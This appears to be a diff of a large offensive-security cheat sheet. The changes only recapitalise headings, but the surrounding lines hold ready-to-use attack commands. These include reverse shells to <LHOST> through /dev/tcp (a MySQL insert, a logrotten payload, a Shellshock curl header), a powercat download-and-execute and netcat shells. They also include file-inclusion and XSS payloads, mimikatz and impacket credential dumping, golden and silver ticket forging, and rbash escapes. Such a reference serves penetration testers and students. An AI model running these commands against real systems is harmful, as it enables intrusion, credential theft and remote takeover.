@@ -501,7 +501,7 @@ Thank you for reading.
 
 ### Basics
 
-#### curl
+#### Curl
 
 ```c
 curl -v http://<DOMAIN>                                                        // verbose output
@@ -562,7 +562,7 @@ powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfil
 
 ##### Bash only
 
-###### wget version
+###### Wget Version
 
 Paste directly to the shell.
 
@@ -603,7 +603,7 @@ function __wget() {
 __wget http://<LHOST>/<FILE>
 ```
 
-###### curl version
+###### Curl Version
 
 ```c
 function __curl() {
@@ -647,7 +647,7 @@ export KRB5CCNAME=<FILE>.ccache
 export KRB5CCNAME='realpath <FILE>.ccache'
 ```
 
-##### Kerberos related Files
+##### Kerberos Related Files
 
 ```c
 /etc/krb5.conf                   // kerberos configuration file location
@@ -665,7 +665,7 @@ kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the key
 
 ##### Ticket Conversion
 
-###### kribi to ccache
+###### Kribi to Ccache
 
 ```c
 base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
@@ -673,7 +673,7 @@ impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
 export KRB5CCNAME=`realpath <USERNAME>.ccache`
 ```
 
-###### ccache to kirbi
+###### Ccache to Kirbi
 
 ```c
 impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
@@ -751,7 +751,7 @@ doas -u <USERNAME> /bin/sh
 export PATH=`pwd`:$PATH
 ```
 
-##### gcc
+##### Gcc
 
 ```c
 gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
@@ -759,13 +759,13 @@ i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 
-##### getfacl
+##### Getfacl
 
 ```c
 getfacl <LOCAL_DIRECTORY>
 ```
 
-##### iconv
+##### Iconv
 
 ```c
 echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
@@ -773,7 +773,7 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ```
 
-##### vi
+##### Vi
 
 ```c
 :w !sudo tee %    # save file with elevated privileges without exiting
@@ -787,7 +787,7 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 
 #### Microsoft Windows
 
-##### dir
+##### Dir
 
 ```c
 dir /a
@@ -826,7 +826,7 @@ rdesktop <RHOST>
 xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 ```
 
-#### showmount
+#### Showmount
 
 ```c
 /usr/sbin/showmount -e <RHOST>
@@ -841,7 +841,7 @@ mount.cifs //<RHOST>/<SHARE> /mnt/remote
 guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
 
-#### smbclient
+#### Smbclient
 
 ```c
 smbclient -L \\<RHOST>\ -N
@@ -856,7 +856,7 @@ smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPT
 smbclient --no-pass //<RHOST>/<SHARE>
 ```
 
-##### Download multiple files at once
+##### Download Multiple Files at once
 
 ```c
 mask""
@@ -865,7 +865,7 @@ prompt OFF
 mget *
 ```
 
-#### socat
+#### Socat
 
 ```c
 socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
@@ -905,25 +905,25 @@ ssh -N -L 0.0.0.0:4455:<RHOST>:445 <USERNAME>@<RHOST>
 sudo nmap -sU -p 123 --script ntp-info <RHOST>
 ```
 
-##### Stop virtualbox-guest-utils to stop syncing Time
+##### Stop Virtualbox-guest-utils to Stop Syncing Time
 
 ```c
 sudo /etc/init.d/virtualbox-guest-utils stop
 ```
 
-##### Stop systemd-timesyncd to sync Time manually
+##### Stop Systemd-timesyncd to Sync Time Manually
 
 ```c
 sudo systemctl stop systemd-timesyncd
 ```
 
-##### Disable automatic Sync
+##### Disable Automatic Sync
 
 ```c
 sudo systemctl disable --now chronyd
 ```
 
-##### Options to set the Date and Time
+##### Options to Set the Date and Time
 
 ```c
 sudo net time -c <RHOST>
@@ -1034,7 +1034,7 @@ stty onlcr
 sudo pkill VBoxClient && VBoxClient --clipboard
 ```
 
-#### virtualenv
+#### Virtualenv
 
 ```c
 sudo apt-get install virtualenv
@@ -1050,7 +1050,7 @@ venv\Scripts\activate
 
 ### Information Gathering
 
-#### memcached
+#### Memcached
 
 >  https://github.com/pd4d10/memcached-cli
 
@@ -1108,7 +1108,7 @@ for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
-#### snmpwalk
+#### Snmpwalk
 
 ```c
 snmpwalk -c public -v1 <RHOST>
@@ -1142,7 +1142,7 @@ export HTTP_PROXY=http://localhost:8080
 export HTTPS_PROXY=https://localhost:8080
 ```
 
-#### cadaver
+#### Cadaver
 
 ```c
 cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
@@ -1175,7 +1175,7 @@ dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 <a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
 ```
 
-###### Get nonce
+###### Get Nonce
 
 ```c
 var ajaxRequest = new XMLHttpRequest();
@@ -1237,7 +1237,7 @@ curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114
 ))</script>" --proxy 127.0.0.1:8080
 ```
 
-#### ffuf
+#### Ffuf
 
 ```c
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
@@ -1364,7 +1364,7 @@ http://<RHOST>/<FILE>.php?file=
 http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
-##### Until php 5.3
+##### Until Php 5.3
 
 ```c
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
@@ -1895,7 +1895,7 @@ ZIP: Remote Code Exection via Local File Inclusion
 PDF / PPTX: Server-Side Request Forgery / Blind XXE
 ```
 
-#### wfuzz
+#### Wfuzz
 
 ```c
 wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
@@ -1907,13 +1907,13 @@ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>
 wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
 ```
 
-##### Custom Scan with limited Output
+##### Custom Scan with Limited Output
 
 ```c
 wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
 ```
 
-##### Fuzzing two Parameters at once
+##### Fuzzing Two Parameters at once
 
 ```c
 wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
@@ -2014,7 +2014,7 @@ username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+S
 
 ### Database Analysis
 
-#### impacket-mssqlclient
+#### Impacket-mssqlclient
 
 ##### Common Commands
 
@@ -2188,13 +2188,13 @@ mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_
 mysql> \! /bin/sh
 ```
 
-##### Insert Code to get executed
+##### Insert Code to Get Executed
 
 ```c
 mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
 ```
 
-##### Write SSH Key into authorized_keys2 file
+##### Write SSH Key into authorized_keys2 File
 
 ```c
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
@@ -2253,7 +2253,7 @@ postgres=# \q                        // quit
 > SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
 ```
 
-##### Enter own SSH Key
+##### Enter Own SSH Key
 
 ```c
 redis-cli -h <RHOST>
@@ -2600,7 +2600,7 @@ http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
 ```
 
-#### sqlite3
+#### Sqlite3
 
 ```c
 sqlite3 <FILE>.db
@@ -2612,7 +2612,7 @@ sqlite> PRAGMA table_info(<TABLE>);
 sqlite> SELECT * FROM <TABLE>;
 ```
 
-#### sqsh
+#### Sqsh
 
 ```c
 sqsh -S <RHOST> -U <USERNAME>
@@ -2689,7 +2689,7 @@ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
 DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ```
 
-#### fcrack
+#### Fcrack
 
 ```c
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
@@ -2697,14 +2697,14 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 
 #### Group Policy Preferences (GPP)
 
-##### gpp-decrypt
+##### Gpp-decrypt
 
 ```c
 python3 gpp-decrypt.py -f Groups.xml
 python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
-#### hashcat
+#### Hashcat
 
 > https://hashcat.net/hashcat/
 
@@ -2748,7 +2748,7 @@ hashcat -m 18200 -a 0 <FILE> <FILE>
 hashcat -m 13100 --force <FILE> <FILE>
 ```
 
-##### Bruteforce based on the Pattern
+##### Bruteforce Based on the Pattern
 
 ```c
 hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
@@ -2760,7 +2760,7 @@ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
 hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
-##### Generate NetNLTMv2 with internalMonologue and crack with hashcat
+##### Generate NetNLTMv2 with internalMonologue and Crack with Hashcat
 
 ```c
 InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
@@ -2772,7 +2772,7 @@ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose
 spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
 ```
 
-##### Crack with hashcat
+##### Crack with Hashcat
 
 ```c
 hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
@@ -2838,7 +2838,7 @@ john --show <FILE>
 laZagne.exe all
 ```
 
-#### mimikatz
+#### Mimikatz
 
 ##### Common Commands
 
@@ -2953,7 +2953,7 @@ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlist
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
 ```
 
-#### pypykatz
+#### Pypykatz
 
 ```c
 pypykatz lsa minidump lsass.dmp
@@ -3166,7 +3166,7 @@ Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurit
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 ```
 
-##### Enumeration using PowerView
+##### Enumeration Using PowerView
 
 ```c
 powershell -ep bypass
@@ -3434,7 +3434,7 @@ klist
 
 - Elevated PowerShell session
 
-###### Creating and storing the Distributed Component Object Model
+###### Creating and Storing the Distributed Component Object Model
 
 ```c
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
@@ -3470,11 +3470,11 @@ Use the `hostname` and not the `IP address` because otherwise it would authentic
 .\PsExec.exe \\<RHOST> cmd
 ```
 
-###### Volume Shadow Service (VSS) aka Shadow Copies
+###### Volume Shadow Service (VSS) Aka Shadow Copies
 
 > https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
 
-###### Create and collect necessary Files
+###### Create and Collect Necessary Files
 
 ```c
 vshadow.exe -nw -p  C:
@@ -3622,7 +3622,7 @@ sudo apt-get install neo4j
 sudo apt-get install bloodhound
 ```
 
-##### Installing and starting Database
+##### Installing and Starting Database
 
 ```c
 wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
@@ -3768,13 +3768,13 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 
 #### Impacket
 
-##### impacket-atexec
+##### Impacket-atexec
 
 ```c
 impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
 ```
 
-##### impacket-dcomexec
+##### Impacket-dcomexec
 
 ```c
 impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<RHOST> '<COMMAND>'
@@ -3826,19 +3826,19 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
 ```
 
-##### impacket-lookupsid
+##### Impacket-lookupsid
 
 ```c
 impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
 ```
 
-##### impacket-netview
+##### Impacket-netview
 
 ```c
 impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
 ```
 
-##### impacket-ntlmrelayx
+##### Impacket-ntlmrelayx
 
 ###### Common Commands
 
@@ -3860,32 +3860,32 @@ dir \\<LHOST>\foobar
 nc -lnvp <LPORT>
 ```
 
-##### impacket-psexec
+##### Impacket-psexec
 
 ```c
 impacket-psexec <USERNAME>@<RHOST>
 impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 ```
 
-##### impacket-req
+##### Impacket-req
 
 ```c
 impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
 ```
 
-##### impacket-rpcdump
+##### Impacket-rpcdump
 
 ```c
 impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
 ```
 
-##### impacket-samrdump
+##### Impacket-samrdump
 
 ```c
 impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
 ```
 
-##### impacket-secretsdump
+##### Impacket-secretsdump
 
 ```c
 impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
@@ -3899,13 +3899,13 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
 ```
 
-##### impacket-services
+##### Impacket-services
 
 ```c
 impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
 ```
 
-##### impacket-smbclient
+##### Impacket-smbclient
 
 ```c
 impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
@@ -3916,19 +3916,19 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
 ```
 
-##### impacket-smbpasswd
+##### Impacket-smbpasswd
 
 ```c
 impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
 ```
 
-##### impacket-smbserver
+##### Impacket-smbserver
 
 ```c
 impacket-smbserver local . -smb2support
 ```
 
-##### impacket-ticketer
+##### Impacket-ticketer
 
 ###### Requirements
 
@@ -3941,7 +3941,7 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
 ```
 
-###### Fixing [-] exceptions must derive from BaseException
+###### Fixing [-] Exceptions Must Derive from BaseException
 
 ###### Issue
 
@@ -3952,7 +3952,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] exceptions must derive from BaseException
 ```
 
-###### To fix it
+###### To Fix it
 
 ```c
 241         if self.__doKerberos:
@@ -4024,7 +4024,7 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
 ```
 
-###### Check Passwords for all Users in Domain
+###### Check Passwords for All Users in Domain
 
 ```c
 .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
@@ -4032,7 +4032,7 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 
 ##### ASPREPRoast
 
-###### Check ASPREPRoast for all Domain Users (Credentials required)
+###### Check ASPREPRoast for All Domain Users (Credentials required)
 
 ```c
 impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
@@ -4046,7 +4046,7 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FIL
 impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 ```
 
-###### Check ASPREPRoast for all Domain Users in Domain
+###### Check ASPREPRoast for All Domain Users in Domain
 
 ```c
 .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
@@ -4070,7 +4070,7 @@ Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII 
 impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
 ```
 
-###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)
+###### Request TGT with aesKey (More Secure Encryption, Probably More Stealth due is it Used by Default)
 
 ```c
 impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
@@ -4096,7 +4096,7 @@ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ```
 
-###### Ask and inject the Ticket
+###### Ask and Inject the Ticket
 
 ```c
 .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
@@ -4136,7 +4136,7 @@ sekurlsa::tickets /export
 .\Rubeus dump
 ```
 
-###### Convert Tickets dumped with Rubeus into base64
+###### Convert Tickets Dumped with Rubeus into Base64
 
 ```c
 [IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
@@ -4157,7 +4157,7 @@ python ticket_converter.py ticket.ccache ticket.kirbi
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
-###### Execute Remote Commands by using TGT
+###### Execute Remote Commands by Using TGT
 
 ```c
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -4167,7 +4167,7 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Using Ticket on Windows
 
-###### Inject Ticket with mimikatz
+###### Inject Ticket with Mimikatz
 
 ```c
 kerberos::ptt <KIRBI_FILE>
@@ -4201,13 +4201,13 @@ python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <S
 python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
 ```
 
-###### Set the ticket for impacket use
+###### Set the Ticket for Impacket Use
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
-###### Execute Remote Commands by using TGT
+###### Execute Remote Commands by Using TGT
 
 ```c
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -4215,7 +4215,7 @@ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ```
 
-##### mimikatz Examples
+##### Mimikatz Examples
 
 ###### Generate TGS with NTLM
 
@@ -4229,7 +4229,7 @@ kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /se
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
-###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
+###### Generate TGS with AES 256bit Key (More Secure Encryption, Probably More Stealth due is it Used by Default)
 
 ```c
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
@@ -4275,7 +4275,7 @@ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
-###### Execute Remote Commands by using TGT
+###### Execute Remote Commands by Using TGT
 
 ```c
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -4283,7 +4283,7 @@ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ```
 
-##### mimikatz Examples
+##### Mimikatz Examples
 
 ###### Generate TGT with NTLM
 
@@ -4297,7 +4297,7 @@ kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERN
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
 ```
 
-###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
+###### Generate TGT with AES 256bit Key (More Secure Encryption, Probably More Stealth due is it Used by Default)
 
 ```c
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
@@ -4329,7 +4329,7 @@ kerberos::ptt <KIRBI_FILE>
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
 ```
 
-#### ldapsearch
+#### Ldapsearch
 
 ```c
 ldapsearch -x -h <RHOST> -s base namingcontexts
@@ -4378,7 +4378,7 @@ su root2
 
 ##### Apache2
 
-###### Read first Line of a File with apache2 Binary
+###### Read First Line of a File with Apache2 Binary
 
 ```c
 sudo /usr/sbin/apache2 -f <FILE>
@@ -4432,7 +4432,7 @@ watch -n 1 "ps -aux | grep pass"
 sudo tcpdump -i lo -A | grep "pass"
 ```
 
-##### find Commands
+##### Find Commands
 
 ```c
 find / -user <USERNAME> -ls 2>/dev/null
@@ -4532,7 +4532,7 @@ gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
 sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
 ```
 
-##### logrotten
+##### Logrotten
 
 > https://github.com/whotwagner/logrotten
 
@@ -4540,13 +4540,13 @@ sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
 if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
 ```
 
-###### If "create"-option is set in logrotate.cfg
+###### If "create"-option is Set in logrotate.cfg
 
 ```c
 ./logrotten -p ./payloadfile /tmp/log/pwnme.log
 ```
 
-###### If "compress"-option is set in logrotate.cfg
+###### If "compress"-option is Set in logrotate.cfg
 
 ```c
 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
@@ -4566,15 +4566,15 @@ export PATH=$(pwd):$PATH
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
-#### rbash
+#### Rbash
 
-##### Breakout using $PATH Variable
+##### Breakout Using $PATH Variable
 
 ```c
 export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-##### Breakouts using less
+##### Breakouts Using less
 
 ```c
 less /etc/profile
@@ -4591,7 +4591,7 @@ less /etc/profile
 v:shell
 ```
 
-##### Breakout using scp
+##### Breakout Using Scp
 
 ```c
 TF=$(mktemp)
@@ -4600,7 +4600,7 @@ chmod +x "$TF"
 scp -S $TF x y:
 ```
 
-##### Breakouts using vi
+##### Breakouts Using Vi
 
 ```c
 vi -c ':!/bin/sh' /dev/null
@@ -4612,7 +4612,7 @@ vi
 :shell
 ```
 
-##### Breakouts using SSH Command Execution
+##### Breakouts Using SSH Command Execution
 
 ```c
 ssh <USERNAME>@<RHOST> -t sh
@@ -4620,7 +4620,7 @@ ssh <USERNAME>@<RHOST> -t /bin/sh
 ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
 ```
 
-##### relayd
+##### Relayd
 
 The binary need to have the `SUID` bit set.
 
@@ -4735,7 +4735,7 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 ```
 
-##### accesschk
+##### Accesschk
 
 ###### Checking File Permissions
 
@@ -4749,7 +4749,7 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
 ```
 
-###### Checking Path Permissions to find Unquoted Service Paths
+###### Checking Path Permissions to Find Unquoted Service Paths
 
 ```c
 .\accesschk.exe /accepteula -uwdq C:\
@@ -5258,7 +5258,7 @@ for i in $(seq 1 254); do nc -zv -w 1 <XXX.XXX.XXX>.$i <RPORT>; done
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
-#### powercat
+#### Powercat
 
 ```c
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
@@ -5304,7 +5304,7 @@ Set-ExecutionPolicy unrestricted
 powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
-##### Import Module to PowerShell cmdlet
+##### Import Module to PowerShell Cmdlet
 
 ```c
 Import-Module .\<FILE>
@@ -5336,7 +5336,7 @@ Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PAT
 Expand-Archive -Force <FILE>.zip
 ```
 
-##### Start a new Process
+##### Start a New Process
 
 ```c
 Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
@@ -5389,7 +5389,7 @@ Start-Process powershell.exe -Credential $credential
 powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
-##### Add new Domain Administrator
+##### Add New Domain Administrator
 
 ```c
 $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
@@ -5427,7 +5427,7 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -R
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
 ```
 
-#### pwncat
+#### Pwncat
 
 ```c
 (local) pwncat$ back    // get back to shell
@@ -5440,7 +5440,7 @@ pwncat-cs -lp <LPORT>
 (local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
 ```
 
-#### rpcclient
+#### Rpcclient
 
 ```c
 rpcclient -U "" <RHOST>
@@ -5510,13 +5510,13 @@ srvinfo
 .\Seatbelt.exe -group=all -full
 ```
 
-#### smbpasswd
+#### Smbpasswd
 
 ```c
 smbpasswd -r <RHOST> -U <USERNAME>
 ```
 
-#### winexe
+#### Winexe
 
 ```c
 winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
@@ -5531,7 +5531,7 @@ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
 ```
 
-#### CVE-2016-1531: exim LPE
+#### CVE-2016-1531: Exim LPE
 
